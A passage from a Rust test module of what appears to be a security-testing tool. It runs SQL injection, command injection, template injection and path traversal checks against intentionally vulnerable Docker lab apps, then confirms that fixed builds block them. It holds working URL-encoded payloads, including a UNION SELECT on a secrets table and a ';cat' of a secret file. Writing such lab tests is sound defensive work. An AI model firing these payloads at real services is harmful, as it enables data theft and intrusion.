        true
    }

    /// Guard: without the opt-in, the lab gate is closed, so a local run creates no
    /// lab containers (#98). It is a no-op in CI, where `REDSTEP_RUN_DOCKER_TESTS`
    /// is set and `linux_docker_available()` would probe a real daemon. Mutation:
    /// drop the `is_none() -> return false` short-circuit -> on a machine with a
    /// Linux Docker daemon and the var unset, it probes and returns `true` -> this
    /// assertion fails. (The development machine runs Docker, so the mutation bites
    /// locally even though CI never exercises this branch.)
    #[test]
    fn lab_tests_default_to_skipped_without_the_opt_in() {
        if std::env::var_os("REDSTEP_RUN_DOCKER_TESTS").is_some() {
            return;
        }
        assert!(
            !linux_docker_available(),
            "without REDSTEP_RUN_DOCKER_TESTS the lab gate must be closed (no containers)"
        );
    }

    /// Guard (Docker, Linux CI leg; self-skips without a daemon): the vantage TCP
    /// executor observes a listening target as reachable from a probe on the
    /// target's own network, and unreachable from a probe on a different,
    /// isolated network where the target's name does not even resolve, matching
    /// what the attacker's vantage would see (#27). It also checks the draft does
    /// not masquerade as a native host-run connect: the capability name marks it
    /// as a vantage probe and the reproduction records the vantage network.
    /// Mutation: in `tcp_reachable_from`, run the probe on a hard-coded network
    /// rather than the `vantage` passed -> the cross-network probe resolves and
    /// reaches the listener -> the unreachable assertion fails.
    ///
    /// It builds its own two egress-less networks and a listening busybox target
    /// rather than a full lab, because a TCP probe is meaningful only against a
    /// listener and the MVP stand-ins do not listen (the end-to-end demo with a
    /// listening db is #28). It lives in-crate, not in `tests/`, because the typed
    /// signature takes a `LabNetwork` (private fields) and a `ScopedTarget` (only
    /// the resolver builds one), neither constructible from an external crate.
    #[test]
    fn tcp_reachable_from_sees_a_listener_on_its_own_network_only() {
        if !linux_docker_available() {
            eprintln!(
                "skipping tcp_reachable_from_sees_a_listener_on_its_own_network_only: no Linux Docker daemon"
            );
            return;
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let tag = format!("redstep-vantage-{}", std::process::id());
            let net_a = format!("{tag}-a");
            let net_b = format!("{tag}-b");
            let listener = format!("{tag}-listener");
            let port = 9000u16;

            // The probe and the listener both run from PROBE_IMAGE; pull it once
            // (`run_probe_cmd`'s create path does not pull, unlike `bring_up`).
            pull_image(&docker, PROBE_IMAGE)
                .await
                .expect("pull the probe image");

            for name in [&net_a, &net_b] {
                docker
                    .create_network(NetworkCreateRequest {
                        name: name.clone(),
                        internal: Some(true),
                        ..Default::default()
                    })
                    .await
                    .expect("create network");
            }

            // A re-listening busybox target on net_a.
            docker
                .create_container(
                    Some(CreateContainerOptions {
                        name: Some(listener.clone()),
                        ..Default::default()
                    }),
                    ContainerCreateBody {
                        image: Some(PROBE_IMAGE.to_owned()),
                        cmd: Some(vec![
                            "sh".to_owned(),
                            "-c".to_owned(),
                            format!("while true; do nc -l -p {port} >/dev/null 2>&1; done"),
                        ]),
                        networking_config: Some(NetworkingConfig {
                            endpoints_config: Some(HashMap::from([(
                                net_a.clone(),
                                EndpointSettings::default(),
                            )])),
                        }),
                        ..Default::default()
                    },
                )
                .await
                .expect("create listener");
            docker
                .start_container(
                    &listener,
                    None::<bollard::query_parameters::StartContainerOptions>,
                )
                .await
                .expect("start listener");

            let spec = format!("{listener}:{port}");
            let scope = crate::scope::Scope::builder()
                .allow(&spec)
                .expect("valid spec")
                .build();
            let target = scope.resolve(&spec).expect("in scope");

            let same_net =
                tcp_reachable_from(&docker, &net("a", &net_a), &target, Duration::from_secs(2))
                    .await;
            let cross_net =
                tcp_reachable_from(&docker, &net("b", &net_b), &target, Duration::from_secs(2))
                    .await;

            // Clean up before asserting so a failed assertion does not leak.
            let _ = docker
                .remove_container(
                    &listener,
                    Some(RemoveContainerOptions {
                        force: true,
                        ..Default::default()
                    }),
                )
                .await;
            for name in [&net_a, &net_b] {
                let _ = docker.remove_network(name).await;
            }

            let (same, same_draft) = same_net.expect("same-network probe ran");
            assert!(
                same.value,
                "a listener on the probe's own network is reachable"
            );
            // The draft marks itself a vantage probe, names its source as the
            // vantage segment, and records that segment in the witness, so it is
            // not mistaken for a native host-run tcp_connect and can be replayed.
            assert_eq!(same_draft.capability, "tcp_connect_vantage");
            assert_eq!(same_draft.target, spec);
            assert_eq!(
                same_draft.source,
                Some(NodeRef::Vantage {
                    segment: "a".to_owned()
                }),
                "the draft names its source as the vantage segment"
            );
            assert_eq!(
                same_draft.reproduction.params["vantage_segment"].as_str(),
                Some("a"),
                "the reproduction records the stable segment the probe ran from"
            );
            // The evidence record must mirror the observation the probe returned,
            // not a hard-coded value: the record feeds the report, the canonical
            // JSON and the replay witness (ADR-0004), so a desynced record is a
            // faithful-looking projection of a lie. This is the only guard (on
            // the CI Docker leg) that `tcp_reachable_from` wires the real
            // observation and the real segment into the draft; `vantage_draft`'s
            // offline tests cannot see which values the caller passes it.
            assert_eq!(
                same_draft.observed,
                serde_json::Value::Bool(same.value),
                "the draft's observed mirrors the reachable observation"
            );
            assert_eq!(
                same_draft.confidence, same.confidence,
                "the draft's confidence mirrors the reachable observation"
            );

            let (cross, cross_draft) = cross_net.expect("cross-network probe ran");
            assert!(
                !cross.value,
                "a listener whose name does not resolve on a different, isolated network is not reachable from the vantage"
            );
            // The unreachable record must mirror its observation too (the decisive
            // false/Low case): without this, a draft wired to a constant `true`
            // would pass the same-net assertion above and go uncaught here.
            assert_eq!(
                cross_draft.observed,
                serde_json::Value::Bool(cross.value),
                "the draft's observed mirrors the unreachable observation"
            );
            assert_eq!(
                cross_draft.confidence, cross.confidence,
                "the draft's confidence mirrors the unreachable observation"
            );
        });
    }

    /// Guard: a `Service` workload runs its command, so its listener is
    /// reachable from the vantage (#46). This is the positive control that
    /// `bring_up` honours the workload kind rather than forcing `sleep`: the
    /// service and the vantage share one segment so the probe reaches it (a
    /// cross-segment probe is the boundary demo's job). Mutation: make
    /// `workload_cmd` return the `sleep` command for a `Service` (ignore the
    /// kind) -> the listener never runs -> the probe is unreachable -> this
    /// fails. Docker-gated, self-skipping; it asserts the probe observation, not
    /// a global object count (RK-010).
    #[test]
    fn a_service_workload_runs_its_command_and_is_reachable() {
        if !linux_docker_available() {
            eprintln!(
                "skipping a_service_workload_runs_its_command_and_is_reachable: no Linux Docker daemon"
            );
            return;
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let port = 9100u16;
            let listen = format!("while true; do nc -l -p {port} >/dev/null 2>&1; done");
            let env = Environment::builder()
                .segment("edge")
                .vantage("edge")
                .service_cmd("svc", PROBE_IMAGE, "edge", &["sh", "-c", &listen])
                .build()
                .expect("a single-segment service environment is valid");

            let lab = bring_up(&docker, &env).await.expect("bring up the lab");
            let edge = lab
                .networks()
                .iter()
                .find(|n| n.segment() == "edge")
                .expect("the edge network")
                .clone();
            let target = crate::scope::Scope::from_environment(&env)
                .resolve(&format!("svc:{port}"))
                .expect("svc is in scope");
            let probe = tcp_reachable_from(&docker, &edge, &target, Duration::from_secs(3)).await;
            let _ = lab.teardown().await;

            let (observation, _draft) = probe.expect("the probe ran");
            assert!(
                observation.value,
                "a Service workload runs its listener, so the vantage reaches it"
            );
        });
    }

    /// The DB-only witness flag seeded in `playground/db/seed.sql`; it is reachable
    /// only by injection, so its presence in an HTTP response is an unambiguous
    /// witness that the SQL injection executed. Kept in sync with that seed file,
    /// which `witness_flag_matches_the_seed` checks offline on every gate.
    const SQLI_WITNESS: &str = "REDSTEP_SQLI_WITNESS_7F3A";

    /// Guard: the flag the exploit greps for is the one the db image actually
    /// seeds. This runs offline on every gate, unlike `sqli_playground_is_exploitable`
    /// which self-skips without Docker or the built images, so a drift between the
    /// two copies of the witness cannot hide behind that self-skip and silently
    /// disarm the exploit check (CLAUDE.md row 6, reached through a guard that did
    /// not run). `include_str!` resolves the path across the workspace `exclude`
    /// boundary at compile time. Mutation: change `SQLI_WITNESS` or the seed
    /// literal so the two differ -> this fails.
    #[test]
    fn witness_flag_matches_the_seed() {
        let seed = include_str!("../../../playground/db/seed.sql");
        assert!(
            seed.contains(SQLI_WITNESS),
            "SQLI_WITNESS {SQLI_WITNESS:?} is not seeded in playground/db/seed.sql; \
             the exploit grep and the db seed have drifted"
        );
    }

    /// A URL-encoded UNION injection for the `name` parameter that reads the flag
    /// from the `secrets` table (two columns, matching the `notes` lookup's two).
    const SQLI_INJECTION: &str = "%27%20UNION%20SELECT%20flag%2C%27x%27%20FROM%20secrets--%20";

    /// The body of the sentinel the cmdi fixture bakes in (`playground/cmdi/secret.txt`,
    /// copied to `/srv/cmdi_secret.txt`); reachable only by an executed command, so its
    /// presence in a response is an unambiguous witness that the injection ran (#85).
    /// Kept in sync with that file, which `witness_flag_matches_the_cmdi_seed` checks
    /// offline on every gate.
    const CMDI_WITNESS: &str = "REDSTEP_CMDI_WITNESS_3D5F";

    /// A URL-encoded command injection for `/exec?cmd=`: a benign token, then a
    /// `;cat` of the sentinel the image bakes in. The witness (`CMDI_WITNESS`, the
    /// file body) is not a substring of this path, so `validate_http_request` accepts
    /// it and only an executed `cat` can surface the witness in the response.
    const CMDI_INJECTION: &str = "x%3Bcat%20/srv/cmdi_secret.txt";

    /// A benign `cmd`, URL-encoded with a space (`%20`) so its decoded echoed form is
    /// not a substring of the request path. The fixed `/exec` runs `echo` with it as
    /// an argument, so only a working `echo` returns it.
    const CMDI_BENIGN: &str = "redstep%20probe";

    /// The benign command's RENDERED (echoed) output: the decoded `CMDI_BENIGN`. The
    /// fix-replay positive control marks on THIS, not the banner, because the fixture
    /// prefixes the banner to every `/exec` response including an error body, so a
    /// banner marker would pass over a broken `echo` and certify a dead endpoint as
    /// fixed (RK-016, a row-6 false "secure"). The decoded form (with the space) is
    /// not a substring of the encoded request path, so `validate_http_request` admits
    /// it as the marker.
    const CMDI_BENIGN_RENDERED: &str = "redstep probe";

    /// Guard: the marker the cmdi exploit reads is the one the image actually bakes
    /// in. Offline on every gate, unlike the Docker-gated cmdi tests that self-skip
    /// without the image, so a drift between the two copies of the witness cannot hide
    /// behind that self-skip and silently disarm the check (CLAUDE.md row 6, RK-014).
    /// `include_str!` resolves the path across the workspace `exclude` boundary at
    /// compile time. Mutation: change `CMDI_WITNESS` or the secret file so they differ
    /// -> this fails.
    #[test]
    fn witness_flag_matches_the_cmdi_seed() {
        let secret = include_str!("../../../playground/cmdi/secret.txt");
        assert!(
            secret.contains(CMDI_WITNESS),
            "CMDI_WITNESS {CMDI_WITNESS:?} is not in playground/cmdi/secret.txt; \
             the exploit marker and the baked secret have drifted"
        );
    }

    /// Guard (Docker; self-skips without a Linux daemon or the built image): the
    /// native command-injection check verdicts `Fail` against the vulnerable cmdi
    /// fixture, carrying the ADR-0009 diagnostic (#85). The witness is the injected
    /// command's OUTPUT (the baked sentinel), not the injected bytes, so the test also
    /// asserts a benign request does NOT return it: a reflected path could otherwise
    /// forge the witness. RK-011: the draft mirrors the observation and is attributed
    /// to the cmdi app. Mutation: `classify_http_witness` returns `false` on a
    /// witnessed body -> no Fail -> the verdict assertion fails.
    #[test]
    fn command_injection_check_flags_the_playground() {
        if !linux_docker_available() {
            eprintln!(
                "skipping command_injection_check_flags_the_playground: no Linux Docker daemon"
            );
            return;
        }
        if !image_present("redstep/cmdi:mvp") {
            eprintln!(
                "skipping command_injection_check_flags_the_playground: image redstep/cmdi:mvp absent (run playground/build.sh)"
            );
            return;
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let env = Environment::builder()
                .segment("lab")
                .vantage("lab")
                .service("cmdi", "redstep/cmdi:mvp", "lab")
                .build()
                .expect("the cmdi environment is valid");

            let lab = bring_up(&docker, &env)
                .await
                .expect("bring up the cmdi fixture (readiness-gated)");
            let vantage = lab
                .networks()
                .iter()
                .find(|n| n.segment() == "lab")
                .expect("the lab network")
                .clone();

            let scope = Scope::from_environment(&env);
            let target = scope.resolve("cmdi:8083").expect("cmdi is in scope");
            let request_path = format!("/exec?cmd={CMDI_INJECTION}");

            let ctx =
                crate::TestContext::new_in_lab(scope.clone(), docker.clone(), vantage.clone());
            let recorded = ctx
                .exploit_command_injection_from_vantage(&target, &request_path, CMDI_WITNESS)
                .await
                .expect("the vantage command-injection probe ran");
            let observed = recorded.observation.value;
            let confidence = recorded.observation.confidence;
            let verdict = ctx.expect(&recorded).to_be(false);

            // The witness is the command's OUTPUT: a benign request must not carry it,
            // or a reflected path could forge the witness (Decision 4 / the
            // marker-not-in-path rule of validate_http_request).
            let benign_url = format!("http://{}:{}/exec?cmd=benign", target.host(), target.port());
            let (_s, benign_body, _h) = run_probe_capturing(
                &docker,
                vantage.name(),
                wget_cmd(&benign_url, 5, &[]),
                Duration::from_secs(10),
            )
            .await
            .expect("the benign /exec probe ran");

            // A benign probe THROUGH the capability earns no diagnostic: the domain
            // diagnostic is gated on `observation.value`, so a clean non-exploit must
            // carry none. Mutation: drop the `observation.value.then(..)` gate in
            // `exploit_command_injection_from_vantage` -> a diagnostic attaches here
            // -> the `is_none()` assertion below fails.
            let benign_recorded = ctx
                .exploit_command_injection_from_vantage(&target, "/exec?cmd=benign", CMDI_WITNESS)
                .await
                .expect("the benign command-injection probe ran");

            let judgements = ctx.take_judgements();
            let drafts = ctx.take_evidence_drafts();
            let _ = lab.teardown().await;

            assert_eq!(
                verdict,
                crate::Verdict::Fail,
                "the vulnerable cmdi fixture is a security FAIL"
            );
            assert!(
                observed,
                "the injected command executed (the witness was returned)"
            );
            assert!(
                !benign_body.contains(CMDI_WITNESS),
                "a benign request never returns the witness: it is the command's output, \
                 not a reflected path"
            );
            assert!(
                !benign_recorded.observation.value,
                "a benign request through the capability is not exploitable"
            );
            assert!(
                benign_recorded.diagnostic.is_none(),
                "a clean non-exploit carries no diagnostic (the observation.value gate)"
            );
            let (judgement, _) = &judgements[0];
            assert_eq!(judgement.verdict, crate::Verdict::Fail);
            let diagnostic = judgement
                .diagnostic
                .as_ref()
                .expect("a FAIL carries a diagnostic");
            assert!(
                diagnostic.probable_cause.contains(CMDI_WITNESS)
                    && diagnostic.probable_cause.contains("command"),
                "the domain cause names the witness and the command: {:?}",
                diagnostic.probable_cause
            );
            assert!(
                diagnostic.remediation.contains("argument vector"),
                "the domain remediation names the arg-vector fix: {:?}",
                diagnostic.remediation
            );
            // RK-011: the draft mirrors the observation, and the finding is attributed
            // to the cmdi app (its host:port), not a constant.
            assert_eq!(drafts[0].capability, "http_cmdi_vantage");
            assert_eq!(drafts[0].observed, serde_json::Value::Bool(observed));
            assert_eq!(drafts[0].confidence, confidence);
            assert_eq!(
                drafts[0].target,
                format!("{}:{}", target.host(), target.port())
            );
        });
    }

    /// Guard (Docker; self-skips without a Linux daemon or the built images): the
    /// recorded command-injection witness replays as still-exploitable against the
    /// vulnerable cmdi fixture and not-exploitable, confidently, against the fixed one
    /// (#85). RK-016 positive control: a benign `/exec` on the fixed build still RUNS
    /// echo and returns its output (`CMDI_BENIGN_RENDERED`, the echoed benign value,
    /// not the banner), so "witness absent" is the fix holding, not a dead endpoint.
    /// The marker is the echoed value rather than the banner because the banner is
    /// prefixed to every response including an error body, so a banner marker would
    /// pass over a broken echo (#91, a row-6 false "secure"). Mutation: revert the api
    /// neutralisation (shell-concat in `fixed` too) -> the injection executes again ->
    /// the `on_fixed` assertion fails; make the fixed `run_exec` return a constant for
    /// every input -> the echoed benign value is absent -> `benign.value` is false ->
    /// this fails (the gap the positive control closes).
    #[test]
    fn command_injection_fix_and_replay_closes_the_loop() {
        if !linux_docker_available() {
            eprintln!(
                "skipping command_injection_fix_and_replay_closes_the_loop: no Linux Docker daemon"
            );
            return;
        }
        for image in ["redstep/cmdi:mvp", "redstep/cmdi:fixed"] {
            if !image_present(image) {
                eprintln!(
                    "skipping command_injection_fix_and_replay_closes_the_loop: image {image} absent (run playground/build.sh)"
                );
                return;
            }
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let flat = |cmdi_image: &str| {
                Environment::builder()
                    .segment("lab")
                    .vantage("lab")
                    .service("cmdi", cmdi_image, "lab")
                    .build()
                    .expect("the cmdi environment is valid")
            };
            let vuln_env = flat("redstep/cmdi:mvp");
            let fixed_env = flat("redstep/cmdi:fixed");
            let request_path = format!("/exec?cmd={CMDI_INJECTION}");

            // Record a genuine exploit against the vulnerable lab and take ITS witness,
            // the reproduction the recorder emits (parallel to the SQLi loop).
            let vuln_lab = bring_up(&docker, &vuln_env)
                .await
                .expect("bring up the vulnerable cmdi fixture");
            let vuln_net = vantage_network(&vuln_lab, "lab").expect("the lab network");
            let vuln_scope = Scope::from_environment(&vuln_env);
            let vuln_target = vuln_scope.resolve("cmdi:8083").expect("cmdi is in scope");
            let (recorded_vuln, draft) = http_witness_exploit_from(
                &docker,
                vuln_net,
                &vuln_target,
                "http_cmdi_vantage",
                &request_path,
                CMDI_WITNESS,
                &[],
                Duration::from_millis(5_000),
            )
            .await
            .expect("the recording exploit ran");
            vuln_lab
                .teardown()
                .await
                .expect("teardown after recording the witness");
            let witness = draft.reproduction;

            let on_vuln = replay_http_witness_probe(&docker, &vuln_env, &witness)
                .await
                .expect("replay against the vulnerable lab ran");
            let on_fixed = replay_http_witness_probe(&docker, &fixed_env, &witness)
                .await
                .expect("replay against the fixed lab ran");

            // Positive control on the fixed lab: a benign /exec still RUNS echo and
            // returns its output, so "witness absent" is the fix, not a dead endpoint.
            // The marker is the echoed benign value, not the banner: the banner is
            // prefixed to every response including an error body, so a banner marker
            // would pass over a broken echo (RK-016).
            let fixed_lab = bring_up(&docker, &fixed_env)
                .await
                .expect("bring up the fixed cmdi fixture");
            let net = fixed_lab
                .networks()
                .iter()
                .find(|n| n.segment() == "lab")
                .expect("the lab network")
                .clone();
            let scope = Scope::from_environment(&fixed_env);
            let target = scope.resolve("cmdi:8083").expect("cmdi is in scope");
            let (benign, _) = http_witness_exploit_from(
                &docker,
                &net,
                &target,
                "http_cmdi_vantage",
                &format!("/exec?cmd={CMDI_BENIGN}"),
                CMDI_BENIGN_RENDERED,
                &[],
                Duration::from_millis(5_000),
            )
            .await
            .expect("the benign /exec ran");
            let _ = fixed_lab.teardown().await;

            assert!(
                recorded_vuln.value,
                "the recording exploit observed the command injection"
            );
            assert!(
                on_vuln.value,
                "the witness replays as still-exploitable against the vulnerable lab"
            );
            assert!(
                !on_fixed.value,
                "the fix closes it: the witness replays not-exploitable against the fixed lab"
            );
            assert_eq!(
                on_fixed.confidence,
                Confidence::High,
                "the fixed negative is confident, not inconclusive"
            );
            assert!(
                benign.value,
                "positive control: the fixed /exec still RUNS echo (its output is returned), not merely answers with the banner"
            );
        });
    }

    /// The secret the api seeds into the `/render` template context
    /// (`playground/api/src/main.rs`, `SSTI_SECRET`); reachable only when an injected
    /// expression is evaluated, so its presence in a response is an unambiguous
    /// witness that the SSTI ran (#90). Kept in sync with that file, which
    /// `witness_flag_matches_the_ssti_seed` checks offline on every gate.
    const SSTI_WITNESS: &str = "REDSTEP_SSTI_WITNESS_7B1A";

    /// A URL-encoded template expression for `/render?tpl=`: `{{ flag }}`, which the
    /// vulnerable build evaluates against its context, returning the seeded secret.
    /// The witness (`SSTI_WITNESS`, the secret) is not a substring of this path, so
    /// `validate_http_request` accepts it and only an evaluated expression can surface
    /// the witness in the response (a reflected path carries only `{{ flag }}`).
    const SSTI_INJECTION: &str = "%7B%7B%20flag%20%7D%7D";

    /// A benign `tpl` with no template syntax, URL-encoded with a space (`%20`) so
    /// its rendered (percent-decoded) form is not a substring of the request path.
    /// Both builds render it to itself (no `{{ }}` to evaluate), so a benign
    /// `/render` response carries the rendered form but never the secret. The
    /// capability-level control in the flags test uses it to prove the differential
    /// is real (a non-template input is no exploit).
    const SSTI_BENIGN: &str = "redstep%20probe";

    /// The benign input's RENDERED form (the percent-decoded `SSTI_BENIGN`). The
    /// fix-replay positive control uses THIS, not the banner, as its marker: the
    /// banner is prefixed to every response including a `template error` body, so a
    /// broken renderer that answered a constant error would still carry the banner
    /// and the control would pass over a dead renderer (RK-016, a row-6 false
    /// "secure"). Only a renderer that actually rendered the input produces this
    /// value. `validate_http_request` accepts it because the decoded form (with the
    /// space) is not a substring of the encoded request path.
    const SSTI_BENIGN_RENDERED: &str = "redstep probe";

    /// Guard: the secret the SSTI exploit reads is the one the api fixture actually
    /// seeds into its template context. Offline on every gate, unlike the Docker-gated
    /// SSTI tests that self-skip without the image, so a drift between the two copies
    /// of the witness cannot hide behind that self-skip and silently disarm the check
    /// (CLAUDE.md row 6, RK-014). `include_str!` resolves the path across the workspace
    /// `exclude` boundary at compile time. Mutation: change `SSTI_WITNESS` or the
    /// fixture's `SSTI_SECRET` so they differ -> this fails.
    #[test]
    fn witness_flag_matches_the_ssti_seed() {
        let fixture = include_str!("../../../playground/api/src/main.rs");
        assert!(
            fixture.contains(SSTI_WITNESS),
            "SSTI_WITNESS {SSTI_WITNESS:?} is not seeded in playground/api/src/main.rs; \
             the exploit marker and the fixture secret have drifted"
        );
    }

    /// Guard (Docker; self-skips without a Linux daemon or the built images): the
    /// native SSTI check verdicts `Fail` against the vulnerable api fixture, carrying
    /// the ADR-0009 diagnostic (#90). The witness is the EVALUATED secret, not the
    /// injected expression, so the test also asserts a benign (non-template) request
    /// does NOT return it and earns no diagnostic: the differential is real and the
    /// `observation.value` diagnostic gate holds. RK-011: the draft mirrors the
    /// observation and is attributed to the api app. Mutation: have the api
    /// `render_tpl` render a fixed template (the fix) in the mvp build -> the
    /// expression is not evaluated -> no secret -> the verdict assertion fails; change
    /// the diagnostic gate to `Some(..)` in `exploit_ssti_from_vantage` -> the benign
    /// control carries a diagnostic -> the `control.diagnostic.is_none()` assertion fails.
    #[test]
    fn ssti_check_flags_the_playground() {
        if !linux_docker_available() {
            eprintln!("skipping ssti_check_flags_the_playground: no Linux Docker daemon");
            return;
        }
        for image in ["redstep/api:mvp", "redstep/db:mvp"] {
            if !image_present(image) {
                eprintln!(
                    "skipping ssti_check_flags_the_playground: image {image} absent (run playground/build.sh)"
                );
                return;
            }
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let env = Environment::builder()
                .segment("lab")
                .vantage("lab")
                .service("api", "redstep/api:mvp", "lab")
                .service("db", "redstep/db:mvp", "lab")
                .build()
                .expect("the flat api+db environment is valid");

            let lab = bring_up(&docker, &env)
                .await
                .expect("bring up the playground (readiness-gated)");
            let vantage = lab
                .networks()
                .iter()
                .find(|n| n.segment() == "lab")
                .expect("the lab network")
                .clone();

            let scope = Scope::from_environment(&env);
            let target = scope.resolve("api:8081").expect("api is in scope");
            let exploit_path = format!("/render?tpl={SSTI_INJECTION}");

            let ctx = crate::TestContext::new_in_lab(scope.clone(), docker.clone(), vantage);
            let recorded = ctx
                .exploit_ssti_from_vantage(&target, &exploit_path, SSTI_WITNESS)
                .await
                .expect("the vantage SSTI probe ran");
            let observed = recorded.observation.value;
            let confidence = recorded.observation.confidence;
            let verdict = ctx.expect(&recorded).to_be(false);

            // A benign (non-template) input renders to itself: it never carries the
            // secret, so the differential is real, not a probe that reads anything as a
            // hit. A benign probe THROUGH the capability also earns no diagnostic (the
            // domain diagnostic is gated on `observation.value`).
            let benign_path = format!("/render?tpl={SSTI_BENIGN}");
            let control = ctx
                .exploit_ssti_from_vantage(&target, &benign_path, SSTI_WITNESS)
                .await
                .expect("the benign SSTI control ran");

            let judgements = ctx.take_judgements();
            let drafts = ctx.take_evidence_drafts();
            let _ = lab.teardown().await;

            assert_eq!(
                verdict,
                crate::Verdict::Fail,
                "the vulnerable api fixture is a security FAIL"
            );
            assert!(
                observed,
                "the injected expression was evaluated (the seeded secret was returned)"
            );
            assert!(
                !control.observation.value,
                "a benign non-template input never carries the secret: the differential is real"
            );
            assert!(
                control.diagnostic.is_none(),
                "a non-exploit (the benign control) carries no diagnostic: the ADR-0009 cause is attached only to a real evaluation, not a clean result"
            );
            let (judgement, _) = &judgements[0];
            assert_eq!(judgement.verdict, crate::Verdict::Fail);
            let diagnostic = judgement
                .diagnostic
                .as_ref()
                .expect("a FAIL carries a diagnostic");
            assert!(
                diagnostic.probable_cause.contains(SSTI_WITNESS)
                    && diagnostic.probable_cause.contains("template"),
                "the domain cause names the witness and that input was evaluated as a template: {:?}",
                diagnostic.probable_cause
            );
            assert!(
                diagnostic.remediation.contains("bound data value"),
                "the domain remediation names the fixed-template / bound-data fix: {:?}",
                diagnostic.remediation
            );
            // RK-011: the evidence draft mirrors the observation, and is tagged as the
            // SSTI capability, so the record is not a faithful-looking projection of a
            // constant nor mislabelled as another check.
            assert_eq!(drafts[0].capability, "http_ssti_vantage");
            assert_eq!(drafts[0].observed, serde_json::Value::Bool(observed));
            assert_eq!(drafts[0].confidence, confidence);
            assert_eq!(
                drafts[0].target,
                format!("{}:{}", target.host(), target.port())
            );
        });
    }

    /// Guard (Docker; self-skips without a Linux daemon or the built images,
    /// including `redstep/api:fixed`): the SSTI attack-to-defense loop closes (#90),
    /// parallel to `command_injection_fix_and_replay_closes_the_loop`. A genuine SSTI
    /// is recorded against the vulnerable api, and its own success witness (the
    /// reproduction the seam emits) replays as still-exploitable against the vulnerable
    /// image and not-exploitable, confidently, against `redstep/api:fixed` (which binds
    /// the input as data). RK-016 positive control: a benign `/render` on the fixed
    /// build still RENDERS its input (the response carries the input's rendered form,
    /// `SSTI_BENIGN_RENDERED`, not just the banner), so "witness absent" is the fix
    /// holding, not a renderer that answers a constant. The marker is the rendered
    /// value rather than the banner because the banner is prefixed to every response
    /// including a `template error` body, so a banner marker would pass over a broken
    /// renderer (a row-6 false "secure"). Mutation: revert the api fix (render the
    /// input as the template in `fixed` too) -> the expression evaluates again -> the
    /// `on_fixed` assertion fails; make the fixed `render_tpl` return a constant
    /// (`"template error"`) for every input -> the rendered benign form is absent ->
    /// `benign.value` is false -> this fails (the gap the positive control closes).
    #[test]
    fn ssti_fix_and_replay_closes_the_loop() {
        if !linux_docker_available() {
            eprintln!("skipping ssti_fix_and_replay_closes_the_loop: no Linux Docker daemon");
            return;
        }
        for image in ["redstep/api:mvp", "redstep/api:fixed", "redstep/db:mvp"] {
            if !image_present(image) {
                eprintln!(
                    "skipping ssti_fix_and_replay_closes_the_loop: image {image} absent (run playground/build.sh)"
                );
                return;
            }
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let flat = |api_image: &str| {
                Environment::builder()
                    .segment("lab")
                    .vantage("lab")
                    .service("api", api_image, "lab")
                    .service("db", "redstep/db:mvp", "lab")
                    .build()
                    .expect("the flat api+db environment is valid")
            };
            let vuln_env = flat("redstep/api:mvp");
            let fixed_env = flat("redstep/api:fixed");
            let request_path = format!("/render?tpl={SSTI_INJECTION}");

            // Record a genuine exploit against the vulnerable lab and take ITS witness,
            // the reproduction the recorder emits (parallel to the sibling loops).
            let vuln_lab = bring_up(&docker, &vuln_env)
                .await
                .expect("bring up the vulnerable api fixture");
            let vuln_net = vantage_network(&vuln_lab, "lab").expect("the lab network");
            let vuln_scope = Scope::from_environment(&vuln_env);
            let vuln_target = vuln_scope.resolve("api:8081").expect("api is in scope");
            let (recorded_vuln, draft) = http_witness_exploit_from(
                &docker,
                vuln_net,
                &vuln_target,
                "http_ssti_vantage",
                &request_path,
                SSTI_WITNESS,
                &[],
                Duration::from_millis(5_000),
            )
            .await
            .expect("the recording exploit ran");
            vuln_lab
                .teardown()
                .await
                .expect("teardown after recording the witness");
            let witness = draft.reproduction;

            let on_vuln = replay_http_witness_probe(&docker, &vuln_env, &witness)
                .await
                .expect("replay against the vulnerable lab ran");
            let on_fixed = replay_http_witness_probe(&docker, &fixed_env, &witness)
                .await
                .expect("replay against the fixed lab ran");

            // Positive control on the fixed lab: a benign /render still returns the
            // banner, so "witness absent" is the fix, not a dead endpoint (RK-016).
            let fixed_lab = bring_up(&docker, &fixed_env)
                .await
                .expect("bring up the fixed api fixture");
            let net = fixed_lab
                .networks()
                .iter()
                .find(|n| n.segment() == "lab")
                .expect("the lab network")
                .clone();
            let scope = Scope::from_environment(&fixed_env);
            let target = scope.resolve("api:8081").expect("api is in scope");
            let (benign, _) = http_witness_exploit_from(
                &docker,
                &net,
                &target,
                "http_ssti_vantage",
                &format!("/render?tpl={SSTI_BENIGN}"),
                SSTI_BENIGN_RENDERED,
                &[],
                Duration::from_millis(5_000),
            )
            .await
            .expect("the benign /render ran");
            let _ = fixed_lab.teardown().await;

            assert!(
                recorded_vuln.value,
                "the recording exploit observed the template injection"
            );
            assert!(
                on_vuln.value,
                "the witness replays as still-exploitable against the vulnerable lab"
            );
            assert!(
                !on_fixed.value,
                "the fix closes it: the witness replays not-exploitable against the fixed lab"
            );
            assert_eq!(
                on_fixed.confidence,
                Confidence::High,
                "the fixed negative is confident, not inconclusive"
            );
            assert!(
                benign.value,
                "positive control: the fixed /render still RENDERS the benign input (its rendered form is returned), not merely answers with the banner"
            );
        });
    }

    /// The body of the sentinel file seeded OUTSIDE the api's web root
    /// (`playground/api/secret.txt`, baked to `/srv/secret.txt`); its presence in a
    /// `/file` response witnesses that a path traversal escaped the web root and
    /// read a file beyond it. Kept in sync with that file, which
    /// `path_traversal_witness_matches_the_sentinel` checks offline on every gate.
    const PATH_TRAVERSAL_WITNESS: &str = "REDSTEP_TRAVERSAL_WITNESS_4B19";

    /// A URL-encoded traversal payload for the `path` parameter: `../secret.txt`,
    /// which walks one level out of `/srv/public` to the `/srv/secret.txt` sentinel.
    const PATH_TRAVERSAL_PAYLOAD: &str = "..%2fsecret.txt";

    /// A benign in-root file the fixed api still serves, and its body, used as the
    /// positive control (RK-016): a working `/file` returns it, a "fix" that served
    /// nothing would not. Matches `playground/api/public/welcome.txt`.
    const BENIGN_FILE_PATH: &str = "welcome.txt";
    const BENIGN_FILE_BODY: &str = "public welcome file";

    /// Guard: the sentinel body the traversal check witnesses is the one the api
